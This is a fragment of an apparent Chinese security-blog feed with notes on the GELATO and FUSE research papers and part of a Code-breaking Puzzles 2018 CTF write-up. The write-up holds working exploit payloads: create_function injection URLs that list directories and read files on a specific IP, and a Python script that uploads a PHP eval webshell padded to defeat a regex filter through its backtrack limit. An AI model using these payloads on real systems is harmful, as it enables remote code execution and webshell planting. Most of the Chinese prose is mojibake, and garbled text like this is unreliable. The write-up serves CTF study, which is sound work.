detection</h4><p>è¿™ä¸ªéƒ¨åˆ†ä¸»è¦æ˜¯è¯„ä¼°æœ¬æ–‡çš„é˜¶æ®µæ€§æ±¡ç‚¹æ¨ç†æŠ€æœ¯åœ¨å…·æœ‰å·²çŸ¥åŸºäºDOMçš„XSSæ¼æ´çš„å¾®å‹åŸºå‡†å’Œåº“ä¸Šçš„æœ‰æ•ˆæ€§ã€‚</p><p>benchmark: Googleçš„Firing Rangeå’ŒIBMçš„åŸºå‡†ã€‚</p><p>æ¯”è¾ƒå¯¹è±¡ï¼šDexterJSä¸­çš„åŠ¨æ€æ±¡ç‚¹è·Ÿè¸ªï¼›CTTï¼ˆChromium Taint Trackingï¼‰[16å¹´çš„USENIX]</p><p>è¡¨ä¸‰æ˜¾ç¤ºæœ¬å¹´çš„æ¡†æ¶æ¯”DexterJSå’ŒCTTå‘ç°äº†æ›´å¤šçš„æ±¡ç‚¹ã€‚è¿™åœ¨urldomæµ‹è¯•ç”¨ä¾‹ä¸­å°¤å…¶æ˜æ˜¾ï¼Œæ–‡æœ¬çš„æ¡†æ¶èƒ½å¤Ÿæ£€æµ‹åˆ°æ˜æ˜¾æ›´å¤šçš„URLå¯æ§æµ‹è¯•ç”¨ä¾‹ã€‚<br><img src="https://i.loli.net/2020/06/25/TKFiADd5va3IzMq.png" alt="-w427"></p><p>è¡¨å››çš„ç»“æœè¡¨æ˜ï¼Œåœ¨0x03ä¸­è®¨è®ºçš„å‡å°‘å‡é˜³æ€§çš„ç­–ç•¥åœ¨é™ä½å‡é˜³æ€§ç‡å’Œæé«˜ç²¾åº¦æ–¹é¢éå¸¸æœ‰æ•ˆã€‚<br><img src="https://i.loli.net/2020/06/25/BQLniF68sEhGHxz.png" alt="-w428"></p><p>è¡¨äº”æŠ¥å‘Šäº†æœ¬æ–‡çš„æ±¡ç‚¹æ¨ç†æœºåˆ¶åœ¨ä¸€äº›å­˜åœ¨å·²çŸ¥æ¼æ´çš„JavaScriptåº“ä¸Šçš„æœ‰æ•ˆæ€§<br><img src="https://i.loli.net/2020/06/25/hJecjMiAydOW8C5.png" alt="-w436"></p><p>è¡¨å…­æ˜¾ç¤ºï¼ŒGELATOå¯ä»¥æˆåŠŸæ£€æµ‹åˆ°éå¹³å‡¡çš„ç°ä»£webåº”ç”¨ä¸­åŸºäºDOMçš„XSSæ¼æ´ï¼Œè€Œå…¶ä»–å·¥å…·å´æ²¡æœ‰æŠ¥å‘Šè¿™äº›æ¼æ´ã€‚ä¸ºäº†æ£€æµ‹è¿™äº›åº”ç”¨ä¸­çš„æ¼æ´ï¼Œéœ€è¦ä¸€ä¸ªçŠ¶æ€æ„ŸçŸ¥çš„çˆ¬è™«æ¥è§¦å‘è„†å¼±è·¯å¾„ã€‚åœ¨è¿™ä¸ªå®éªŒä¸­ï¼ŒGELATOæ˜¯å”¯ä¸€ä¸€ä¸ªæ‹¥æœ‰æœ‰æ•ˆçš„çŠ¶æ€æ„ŸçŸ¥çˆ¬è™«çš„å·¥å…·ï¼ŒæˆåŠŸåœ°æ¢ç´¢äº†åº”ç”¨ç¨‹åºå¹¶è§¦å‘äº†è„†å¼±è·¯å¾„ã€‚<br><img src="https://i.loli.net/2020/06/25/vZYzsTA2UCbJcaq.png" alt="-w423"></p><p>è¡¨ä¸ƒï¼šæ¯”è¾ƒæˆ‘ä»¬åŸºäºDOMçš„XSSæ£€æµ‹çš„å¼•å¯¼çˆ¬è¡Œç­–ç•¥ï¼ˆACGï¼‰å’Œéšæœºç­–ç•¥ï¼ˆRandomï¼‰ã€‚<br><img src="https://i.loli.net/2020/06/25/DzNQH4bR2J3dPxo.png" alt="-w431"></p><h3 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h3><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ä¸ªåŠ¨æ€åˆ†æå·¥å…·GELATOï¼Œå¯ä»¥æ£€æµ‹ç°ä»£å’Œå¤æ‚çš„<strong>å®¢æˆ·ç«¯JavaScriptåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´</strong>ï¼Œè¿™äº›åº”ç”¨ç¨‹åºé€šå¸¸å»ºç«‹åœ¨åº“å’Œæ¡†æ¶ä¹‹ä¸Šã€‚æˆ‘ä»¬ç ”ç©¶äº†æœ€å…ˆè¿›çš„å·¥å…·ï¼Œå¹¶æå‡ºäº†ä¸€ä¸ª<strong>å®‰å…¨æ„ŸçŸ¥çš„å®¢æˆ·ç«¯åˆ†æåº”è¯¥æ”¯æŒçš„æœ€å…³é”®åŠŸèƒ½</strong>ã€‚ä½œè€…æå‡ºäº†<strong>ç¬¬ä¸€ä¸ªå®‰å…¨å¼•å¯¼çš„å®¢æˆ·ç«¯åˆ†æ</strong>ï¼Œé€šè¿‡é‡‡å–<strong>åé¦ˆé©±åŠ¨</strong>çš„æ–¹æ³•ï¼Œ<strong>ç»“åˆé™æ€å’ŒåŠ¨æ€åˆ†æ</strong>æ¥è‡ªåŠ¨åˆ†æå¤æ‚çš„æ¡†æ¶ï¼Œå¹¶æœ‰æ•ˆåœ°æé«˜ç¨‹åºä¸­å®‰å…¨æ•æ„Ÿéƒ¨åˆ†çš„è¦†ç›–ç‡ï¼Œä»è€Œç¼©å°äº†çŠ¶æ€æ„ŸçŸ¥çˆ¬è¡Œå’Œå®¢æˆ·ç«¯å®‰å…¨åˆ†æä¹‹é—´çš„å·®è·ã€‚ä½œè€…å¯¹GELATOè¿›è¡Œäº†ä¸åŒå¤æ‚ç¨‹åº¦çš„åº”ç”¨å’ŒåŸºå‡†çš„è¯„ä¼°ï¼Œç»“æœæ˜¾ç¤ºå…¶<strong>æ€§èƒ½ä¼˜äºç°æœ‰çš„çˆ¬è™«</strong>ã€‚æœ€åï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„è½»é‡çº§<strong>éä¾µå…¥å¼å®¢æˆ·ç«¯æ±¡ç‚¹åˆ†ææ–¹æ³•</strong>ï¼Œå®ƒå¯ä»¥æŠ¥å‘Šç°ä»£JavaScriptåº”ç”¨ä¸­çš„éå¹³å‡¡æ±¡ç‚¹ï¼Œå¹¶ä¸”ä¸ç°æœ‰çš„åŠ¨æ€å®¢æˆ·ç«¯æ±¡ç‚¹åˆ†æå·¥å…·ç›¸æ¯”å…·æœ‰æ›´é«˜çš„å‡†ç¡®æ€§ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç¬”è®°ä½œè€…ï¼šz3r0yu&lt;br&gt;è®ºæ–‡ä½œè€…ï¼šBehnaz Hassanshahi, Hyunjun Lee, Paddy Krishnan, JÃ¶rn GÃ¼y SuÃŸ&lt;br&gt;è®ºæ–‡é“¾æ¥ï¼š&lt;a href=&quot;https://arxiv.org/abs/2004.06292&quot; targ
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FUSE-&gt;Finding File Upload Bugs via Penetration Testing</title>
    <link href="http://zer0yu.github.io/2020/06/04/FUSE-Finding-File-Upload-Bugs-via-Penetration-Testing/"/>
    <id>http://zer0yu.github.io/2020/06/04/FUSE-Finding-File-Upload-Bugs-via-Penetration-Testing/</id>
    <published>2020-06-04T03:04:19.000Z</published>
    <updated>2020-06-04T03:05:18.490Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬”è®°ä½œè€…ï¼šz3r0yu</p><p>åŸæ–‡ä½œè€…ï¼šTaekjin Lee, Seongil Wi, Suyoung Lee, Sooel Son</p><p>åŸæ–‡æ ‡é¢˜ï¼šFUSE: Finding File Upload Bugs via Penetration Testing</p><p>åŸæ–‡æ¥æºï¼šNDSS 2020</p><h4 id="0x00-å®šä¹‰"><a href="#0x00-å®šä¹‰" class="headerlink" title="0x00 å®šä¹‰"></a>0x00 å®šä¹‰</h4><ol><li>UFU ä¸å—çº¦æŸçš„æ–‡ä»¶ä¸Šä¼ </li><li>UEFU ä¸å—çº¦æŸçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸Šä¼ <h4 id="0x01-é’ˆå¯¹çš„ä¸¤ä¸ªæŒ‘æˆ˜"><a href="#0x01-é’ˆå¯¹çš„ä¸¤ä¸ªæŒ‘æˆ˜" class="headerlink" title="0x01 é’ˆå¯¹çš„ä¸¤ä¸ªæŒ‘æˆ˜"></a>0x01 é’ˆå¯¹çš„ä¸¤ä¸ªæŒ‘æˆ˜</h4></li><li>ç»•è¿‡å†…å®¹è¿‡æ»¤æ£€æŸ¥ç³»ç»Ÿçš„æ£€æŸ¥ï¼›</li><li>ä¸Šä¼ ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¯ä»¥æ˜¯PHP, HTML, XHTML, and JSï¼‰<h4 id="0x02-åº”å¯¹æŒ‘æˆ˜çš„æ–¹æ³•"><a href="#0x02-åº”å¯¹æŒ‘æˆ˜çš„æ–¹æ³•" class="headerlink" title="0x02 åº”å¯¹æŒ‘æˆ˜çš„æ–¹æ³•"></a>0x02 åº”å¯¹æŒ‘æˆ˜çš„æ–¹æ³•</h4></li><li><p>13ç§å˜å¼‚ç­–ç•¥+5ä¸ªåŸºç¡€çš„å˜å¼‚æ–‡ä»¶å¯¹è±¡â€“&gt;é’ˆå¯¹æŒ‘æˆ˜1</p></li><li><p>ç§å­æ–‡ä»¶çš„å¯æ‰§è¡Œæ€§ä¸ä¼šè¢«ç ´åï¼Œä¹Ÿå°±æ˜¯ä¿è¯äº†æ˜¯å¯ä»¥æ‰§è¡Œçš„ â€“&gt;é’ˆå¯¹æŒ‘æˆ˜2</p></li></ol><h4 id="0x03-å·¥å…·è®¾è®¡çš„å‡ ä¸ªé˜¶æ®µ"><a href="#0x03-å·¥å…·è®¾è®¡çš„å‡ ä¸ªé˜¶æ®µ" class="headerlink" title="0x03 å·¥å…·è®¾è®¡çš„å‡ ä¸ªé˜¶æ®µ"></a>0x03 å·¥å…·è®¾è®¡çš„å‡ ä¸ªé˜¶æ®µ</h4><ol><li>Chain Coordination: æ„é€ é“¾å¼å˜å¼‚ç»„åˆï¼Œå¦‚æœé“¾ä¸Šçš„æŸä¸€ä¸ªå˜å¼‚æ–¹å¼å¯ä»¥è§¦å‘æ¼æ´ï¼Œåˆ™åé¢çš„å†…å®¹å°†ä¸ä¼šç»§ç»­è¿›è¡Œã€‚æ³¨æ„åˆ°è¿™ä¸ªé“¾å…¶å®å°±æ˜¯å¯¹åˆ¶å®šçš„å˜å¼‚ç­–ç•¥çš„å„ç§ç»„åˆã€‚ä½†æ˜¯å¦‚è¿‡ä¸¤ä¸ªå˜å¼‚ç­–ç•¥æ˜¯äº’ç›¸å†²çªçš„ï¼Œåˆ™ä¼šå°†è¿™ç§ç»„åˆæ–¹å¼æ¸…é™¤æ‰ã€‚</li><li>Mutating and Sending Upload Requests: è¿™ä¸ªä¸»è¦æ˜¯å¯¹æ•´ä½“æ–‡ä»¶ä¸Šä¼ çš„è¡¨è¿°ã€‚ä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œæåˆ°äº†unique identifierï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œå†™è¿‡PoCçš„éƒ½çŸ¥é“è¿™ä¸ªå¯ä»¥ç¡®ä¿æˆ‘ä»¬æ¼æ´éªŒè¯çš„å‡†ç¡®æœ‰æ•ˆçš„ã€‚ä½†åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œè¿™ä¸ªå€¼ä¸»è¦ç”¨åœ¨äº†ä¸¤ä¸ªåœ°æ–¹ï¼šæ–‡ä»¶åå’Œæ–‡ä»¶çš„å†…å®¹æ³¨é‡Š</li><li>Upload Validation: ç¬¬ä¸€æ­¥æ˜¯æ ¹æ®responseæ¥éªŒè¯æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼›ç¬¬äºŒæ­¥æ˜¯UPLOAD VALIDATORä¸­ä½¿ç”¨çš„ä¸‰ç§æ–¹å¼æ¥å¯¹æ¼æ´çš„å­˜åœ¨åšéªŒè¯ã€‚ä½¿ç”¨çš„æ–¹æ³•è¿˜æŒºæœ‰æ„æ€ã€‚</li><li>Uploading .htaccess: è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨æ¥ç‰¹æ®Šè€ƒè™‘çš„ï¼Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯å¯ä»¥ç›´æ¥æ§åˆ¶PHPè§£é‡Šå™¨çš„è¡Œä¸ºçš„ã€‚å¦‚æœèƒ½ä»»æ„ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶é‚£ä¹ˆå¯¹åº”çš„ç›®å½•å°±å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶äº†ã€‚<h4 id="0x04-å˜å¼‚çš„å¯¹è±¡-Mutation-objectives"><a href="#0x04-å˜å¼‚çš„å¯¹è±¡-Mutation-objectives" class="headerlink" title="0x04 å˜å¼‚çš„å¯¹è±¡ (Mutation objectives)"></a>0x04 å˜å¼‚çš„å¯¹è±¡ (Mutation objectives)</h4>1) Checking the absence of content-filtering checks<br>2) Eliciting incorrect type inferences based on Content<br>3) Exploiting incomplete whitelists or blacklists based on Extension<br>4) Bypassing keyword filtering logic based on Content<br>5) Bypassing filtering logic based on Content-Type<h4 id="0x05-13ç§å˜å¼‚ç­–ç•¥"><a href="#0x05-13ç§å˜å¼‚ç­–ç•¥" class="headerlink" title="0x05 13ç§å˜å¼‚ç­–ç•¥"></a>0x05 13ç§å˜å¼‚ç­–ç•¥</h4><img src="https://pic.downk.cc/item/5ed86489c2a9a83be5b44e6c.png" alt></li></ol><h4 id="0x06-benchmark"><a href="#0x06-benchmark" class="headerlink" title="0x06 benchmark"></a>0x06 benchmark</h4><p>(1) the evaluation set covered by NAVEX<br>(2) popular CMS applications listed by W3Techs<br>(3) highly rated CMS projects in PHP with more than 500 stars on GitHub that report no errors in their installations.</p><h4 id="0x07-ä¸ªäººçœ‹æ³•"><a href="#0x07-ä¸ªäººçœ‹æ³•" class="headerlink" title="0x07 ä¸ªäººçœ‹æ³•"></a>0x07 ä¸ªäººçœ‹æ³•</h4><ol><li>æ€»ä½“çš„ç³»ç»Ÿè®¾è®¡å’Œå˜å¼‚ç­–ç•¥å¾ˆä¸é”™ï¼ˆä½†æ˜¯å˜å¼‚ç­–ç•¥ä¸å®Œå…¨ï¼Œè¿™ä¸ªå¥½åŠåœ¨å·¥ç¨‹æ–¹é¢è¡¥ä¸Šå°±è¡Œï¼‰</li><li>æ„Ÿè§‰æ¯”è¾ƒå¥½çš„æ˜¯ä½œè€…å¯¹å¾ˆå¤šæƒ…å†µè¿›è¡Œäº†å®šä¹‰ï¼Œè¡¨è¿°å¾ˆæ¸…æ™°</li><li>è¿™ä¸ªç³»ç»Ÿå¯ä»¥é›†æˆåˆ°æ¡†æ¶ä¸­æ¥å¯¹ä¸Šä¼ æ¼æ´è¿›è¡Œå‘ç°ï¼Œä¹Ÿå¯ä»¥ç»§ç»­ä¼˜åŒ–æ¥åŠ å¼ºå…¶æ¼æ´å‘ç°èƒ½åŠ›<h4 id="0x08-é™„å½•"><a href="#0x08-é™„å½•" class="headerlink" title="0x08 é™„å½•"></a>0x08 é™„å½•</h4>è®ºæ–‡é“¾æ¥ï¼š<a href="https://wsp-lab.github.io/papers/lee-fuse-ndss20.pdf" target="_blank" rel="noopener">https://wsp-lab.github.io/papers/lee-fuse-ndss20.pdf</a><br>å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/WSP-LAB/FUSE" target="_blank" rel="noopener">https://github.com/WSP-LAB/FUSE</a></li></ol><p>PS: è¿™ç¯‡çŸ­æ–‡åªå¯¹è®ºæ–‡å…³é”®ç‚¹åšäº†ç®€è¿°ï¼Œ<a href="https://blog.csdn.net/Sunny_Ducky/article/details/105475537" target="_blank" rel="noopener">ç¿»è¯‘ç‰ˆæœ¬(è¾ƒä¸ºç²—ç•¥)</a>å’Œ<a href="https://nosec.org/home/detail/4187.html" target="_blank" rel="noopener">å…¶å®ƒç®€è¿°</a>è§é“¾æ¥ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç¬”è®°ä½œè€…ï¼šz3r0yu&lt;/p&gt;
&lt;p&gt;åŸæ–‡ä½œè€…ï¼šTaekjin Lee, Seongil Wi, Suyoung Lee, Sooel Son&lt;/p&gt;
&lt;p&gt;åŸæ–‡æ ‡é¢˜ï¼šFUSE: Finding File Upload Bugs via Penetration Testin
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Code-breaking Puzzles 2018 Note</title>
    <link href="http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/"/>
    <id>http://zer0yu.github.io/2020/06/04/Code-breaking-Puzzles-2018-Note/</id>
    <published>2020-06-04T02:44:31.000Z</published>
    <updated>2020-06-04T03:02:44.778Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>é¢˜ç›®çŸ¥è¯†ç‚¹æ¦‚è¿°ï¼š</p><ol><li>function PHPå‡½æ•°åˆ©ç”¨æŠ€å·§</li><li>pcrewaf PHPæ­£åˆ™ç‰¹æ€§</li><li>phpmagic PHPå†™æ–‡ä»¶æŠ€å·§</li><li>phplimit PHPä»£ç æ‰§è¡Œé™åˆ¶ç»•è¿‡</li><li>nodechr Javascriptå­—ç¬¦ä¸²ç‰¹æ€§</li><li>javacon SPELè¡¨è¾¾å¼æ²™ç›’ç»•è¿‡</li><li>lumenserial ååºåˆ—åŒ–åœ¨7.2ä¸‹çš„åˆ©ç”¨</li><li>picklecode Pythonååºåˆ—åŒ–æ²™ç›’ç»•è¿‡</li><li>thejs Javascriptçš„åŸå‹æ±¡æŸ“æ¼æ´</li></ol><p>é¢˜ç›®æ¥æºï¼š<a href="https://code-breaking.com/" target="_blank" rel="noopener">Website</a> | <a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">Github</a></p><p>PS: æ¯”è¾ƒæ—©å†™çš„ç¬”è®°ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æ—¶é—´è¡¥å®Œ(è¿™ç¬”è®°å¥½åƒæ‹–äº†å¿«ä¸€å¹´ï¼Ÿï¼Ÿï¼Ÿ)ï¼Œæš‚æ—¶ä¸è¡¥å……äº†ï¼›ç‰¹ç‚¹æ˜¯è¯¦ç»†ï¼Œæ„Ÿè§‰æ–°æ‰‹ä¹Ÿèƒ½çœ‹å¾—æ‡‚</p><h2 id="0x01-function"><a href="#0x01-function" class="headerlink" title="0x01 function"></a>0x01 function</h2><p>ä»£ç ä»¥åŠé¢˜ç›®ç¯å¢ƒå¯ä»¥ä»Githubä¸Šæ‰¾åˆ°ï¼Œä¸€ä¸‹ä¸åœ¨èµ˜è¿°ï¼ŒåªæåŠçŸ¥è¯†ç‚¹ï¼Œ</p><h3 id="1-è§£å†³æ­£åˆ™é—®é¢˜"><a href="#1-è§£å†³æ­£åˆ™é—®é¢˜" class="headerlink" title="1.è§£å†³æ­£åˆ™é—®é¢˜"></a>1.è§£å†³æ­£åˆ™é—®é¢˜</h3><p><code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code>ï¼Œ<code>$action</code>ä¸­è¦å‡ºç°æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ä»¥å¤–çš„å­—ç¬¦ã€‚<br>å¯ä»¥ç›´æ¥ä½¿ç”¨burpå¯¹å­—ç¬¦è¿›è¡Œæµ‹è¯•(ä½†è¿™ä¸ªå­—ç¬¦å¿…é¡»è¿˜æ˜¯æœ‰ç”¨çš„)</p><p><img src="https://i.loli.net/2020/06/04/aiYyHN4MxwXjGrA.png" alt="4D3EEB6F-D725-4532-A1BD-17720F6F5BA6.png"></p><p>PS:ç½‘ä¸Šæœ‰çš„è¯´åœ¨è¿™é‡Œæµ‹è¯•ASCIIå­—ç¬¦ï¼Œå…¶å®å°±æ˜¯æœ‰æ•ˆå­—ç¬¦çš„æ„æ€</p><p>è‡³äºä¸ºä»€ä¹ˆæ˜¯ <code>\</code>ï¼š</p><blockquote><p>code-breaking puzzlesç¬¬ä¸€é¢˜ï¼Œfunctionï¼Œä¸ºä»€ä¹ˆå‡½æ•°å‰é¢å¯ä»¥åŠ ä¸€ä¸ª%5cï¼Ÿ<br>å…¶å®ç®€å•çš„ä¸è¡Œï¼Œphpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚<br>å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p></blockquote><p>å°±æ˜¯\åœ¨phpä¸­è¡¨ç¤ºé»˜è®¤çš„å‘½åç©ºé—´ï¼Œæ¯”å¦‚å†™ä¸€äº›ç±»çš„æ—¶å€™ä¼šåœ¨å¼€å¤´å†™<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">2.</span> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br></pre></td></tr></table></figure></p><h3 id="2-create-function-gt-rce"><a href="#2-create-function-gt-rce" class="headerlink" title="2.create_function-&gt;rce"></a>2.create_function-&gt;rce</h3><p>ä½¿ç”¨<code>create_function(&#39;&#39;, $_GET[&#39;code&#39;]);</code>è¾¾åˆ°è¿œç¨‹RCEçš„æ•ˆæœ</p><p>å…·ä½“å¯ä»¥çœ‹phpçš„æºç  Zend/zend_builtin_functions.c:1858</p><p>å¯è§ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ˜¯function_argsã€function_codeï¼Œä»–ä»¬è¢«æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„PHPå‡½æ•°ï¼š</p><p><code>function __lambda_func ( function_args ) { function_code } \0</code></p><p>è¿™ä¸ªå‡½æ•°ä»£ç ä¼šå…ˆæ”¾åœ¨zend_eval_stringlé‡Œæ‰§è¡Œï¼Œå¯ä»¥ç†è§£ä¸ºevalã€‚æ‰§è¡ŒæˆåŠŸåï¼Œå†äºå‡½æ•°åˆ—è¡¨ä¸­æ‰¾åˆ°<strong>lambda_funcå‡½æ•°ï¼Œå°†å…¶é‡å‘½åæˆlambda_%dï¼Œ%dä»£è¡¨â€œè¿™æ˜¯æœ¬è¿›ç¨‹ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°â€ã€‚æœ€åä»å‡½æ•°åˆ—è¡¨é‡Œåˆ é™¤</strong>lambda_funcã€‚</p><p>ç”±äºä»£ç å°±æ˜¯ç®€å•çš„æ‹¼æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‹¬å·ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚æ¯”å¦‚ï¼š</p><ol><li>å¦‚æœå¯æ§åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆåœ†æ‹¬å·å’Œå¤§æ‹¬å·ï¼šcreate_function(â€˜){}phpinfo();//â€˜, â€˜â€™);</li><li>å¦‚æœå¯æ§åœ¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œéœ€è¦é—­åˆå¤§æ‹¬å·ï¼šcreate_function(â€˜â€™, â€˜}phpinfo();//â€˜);</li></ol><p>PS:</p><ol><li><p>æ‰©å±•ä¸€ä¸‹ï¼Œç±»ä¼¼çš„evalä¹Ÿæ˜¯å°†å…¶ä¸­çš„å­—ç¬¦ä¸²ä¸è¿›è¡Œæ‹¼æ¥<br><code>&quot;&lt;?php &quot;.$code.&quot;?&gt;&quot;</code><br>ä»è€Œå¯ä»¥ä¼ å…¥å›¾?&gt;ã€&lt;?phpé—­åˆå‰åçš„æ ‡ç­¾ï¼Œè®©ä¸­é—´çš„ä»£ç å—ä¸ä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œã€‚</p></li><li><p>è¡¥å……ä¸¤ä¸ªCTFå¸¸ç”¨çš„æŸ¥çœ‹æ–‡ä»¶çš„å‡½æ•°</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(scandir(&apos;../&apos;));/*</span><br><span class="line"></span><br><span class="line">http://51.158.75.42:8087/?action=\create_function&amp;arg=1;&#125;print_r(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));/*</span><br></pre></td></tr></table></figure><h2 id="0x02-pcrewaf"><a href="#0x02-pcrewaf" class="headerlink" title="0x02 pcrewaf"></a>0x02 pcrewaf</h2><p>å…³é”®åœ¨äºæ­£åˆ™åŒ¹é…çš„ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆè¦çŸ¥é“æ­£åˆ™çš„åŒ¹é…æµç¨‹å’Œå¼•æ“</p><blockquote><p>DFA: ä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶æ ¹æ®æ­£åˆ™æ¥ä¸€æ­¥æ­¥ç¡®å®šè‡³ä¸‹ä¸€ä¸ªè½¬ç§»çŠ¶æ€ï¼Œç›´åˆ°åŒ¹é…ä¸ä¸Šæˆ–èµ°å®Œæ•´ä¸ªè¾“å…¥<br>NFAï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€</p></blockquote><p>PHPé‡‡ç”¨çš„æ˜¯NFAçš„æ­£åˆ™å¼•æ“ï¼Œå…·ä½“çš„è§£æè§ <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">ã€ŠPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ã€‹</a></p><p>åˆ©ç”¨åˆ™æ˜¯é€šè¿‡å‘é€è¶…é•¿å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œä½¿æ­£åˆ™æ‰§è¡Œå¤±è´¥ï¼Œæœ€åç»•è¿‡ç›®æ ‡å¯¹PHPè¯­è¨€çš„é™åˆ¶ã€‚</p><p>POC<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://51.158.75.42:8088/index.php'</span>, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure></p><p>or<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">"&lt;?php print_r(scandir('../../../'));print_r(file_get_contents('../../../flag_php7_2_1s_c0rrect'));/*"</span>+<span class="string">'A'</span>*<span 